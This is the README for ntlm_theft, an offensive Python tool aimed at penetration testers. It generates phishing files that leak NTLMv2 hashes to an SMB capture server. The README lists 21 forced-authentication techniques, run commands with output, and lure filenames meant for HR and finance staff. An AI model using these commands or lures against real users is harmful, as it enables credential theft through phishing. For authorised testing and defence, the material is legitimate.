# ntlm_theft

A tool for generating multiple types of NTLMv2 hash theft files.

ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network. 

The benefits of these file types over say macro based documents or exploit documents are that all of these are built using "intended functionality". None were flagged by Windows Defender Antivirus on June 2020, and 17 of the 21 attacks worked on a fully patched Windows 10 host.  

ntlm_theft supports the following attack types:

* Browse to Folder Containing
	* .url – via URL field
	* .url – via ICONFILE field
	* .lnk - via icon_location field
	* .scf – via ICONFILE field (Not Working on Latest Windows)
	* autorun.inf via OPEN field (Not Working on Latest Windows)
	* desktop.ini - via IconResource field (Not Working on Latest Windows)
* Open Document
	* .xml – via Microsoft Word external stylesheet
	* .xml – via Microsoft Word includepicture field
	* .htm – via Chrome & IE & Edge img src (only if opened locally, not hosted)
	* .docx – via Microsoft Word includepicture field
	* .docx – via Microsoft Word external template
	* .docx – via Microsoft Word frameset webSettings
	* .xlsx - via Microsoft Excel external cell
	* .wax - via Windows Media Player playlist (Better, primary open)
	* .asx – via Windows Media Player playlist (Better, primary open)
	* .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
	* .jnlp – via Java external jar
	* .application – via any Browser (Must be served via a browser downloaded or won’t run)
* Open Document and Accept Popup
	* .pdf – via Adobe Acrobat Reader
* Click Link in Chat Program
	* .txt – formatted link to paste into Zoom chat


## Usecases (Why you want to run this)

ntlm_theft is primarily aimed at Penetration Testers and Red Teamers, who will use it to perform internal phishing on target company employees, or to mass test antivirus and email gateways. It may also be used for external phishing if outbound SMB access is allowed on the perimeter firewall.

I've found it useful while penetration testing to easily see what file types I have available to me, rather than spending time configuring a specific attack as would be used on red teaming engagements. You could send a .rtf or .docx file to the HR department, and a .xlsx spreadsheet doc to the finance department.

## Getting Started

These instructions will show you the requirements for and how to use ntlm_theft.

### Prerequisites

ntlm_theft requires Python3 and xlsxwriter:

```
pip3 install xlsxwriter
```

### Required Parameters

To start up the tool 4 parameters must be provided, an input format, the input file or folder and the basic running mode:

```
-g, --generate	: Choose to generate all files or a specific filetype
-s, --server 	: The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)
-f, --filename	: The base filename without extension, can be renamed later (eg: test, Board-Meeting2020, Bonus_Payment_Q4)
```

### Example Runs

Here is an example of what a run looks like generating all files:

```
# python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
Created: test/test.scf (BROWSE)
Created: test/test-(url).url (BROWSE)
Created: test/test-(icon).url (BROWSE)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Generation Complete.
```

![Example Run](docs/example-run.png?raw=true "Example Run")


Here is an example of what a run looks like generating only modern files:

```
# python3 ntlm_theft.py -g modern -s 127.0.0.1 -f meeting
Skipping SCF as it does not work on modern Windows
Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
Created: meeting/meeting.rtf (OPEN)
Created: meeting/meeting-(stylesheet).xml (OPEN)
Created: meeting/meeting-(fulldocx).xml (OPEN)
Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(includepicture).docx (OPEN)
Created: meeting/meeting-(remotetemplate).docx (OPEN)
Created: meeting/meeting-(frameset).docx (OPEN)
Created: meeting/meeting-(externalcell).xlsx (OPEN)
Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: meeting/meeting.asx (OPEN)
Created: meeting/meeting.jnlp (OPEN)
Created: meeting/meeting.application (DOWNLOAD AND OPEN)
Created: meeting/meeting.pdf (OPEN AND ALLOW)
Skipping zoom as it does not work on the latest versions
Skipping Autorun.inf as it does not work on modern Windows
Skipping desktop.ini as it does not work on modern Windows
Generation Complete.
```

Here is an example of what a run looks like generating only a xlsx file:

```
# python3 ntlm_theft.py -g xlsx -s 192.168.1.103 -f Bonus_Payment_Q4
Created: Bonus_Payment_Q4/Bonus_Payment_Q4-(externalcell).xlsx (OPEN)
Generation Complete.
```

## Authors

* **Jacob Wilkin** - *Research and Development*

## License

ntlm_theft
Created by Jacob Wilkin
Copyright (C) 2020 Jacob Wilkin
 
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

## Acknowledgments

* [Ired](https://ired.team/offensive-security/initial-access/t1187-forced-authentication)
* [Securify](https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html)
* [Pentestlab](https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/)
* [deepzec](https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py)
* [rocketscientist911](https://github.com/rocketscientist911/excel-ntlmv2)
* [Osanda](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [Violation Industry](https://www.youtube.com/watch?v=PDpBEY1roRc)
* [@kazkansouh](https://github.com/kazkansouh) - Adding .lnk support
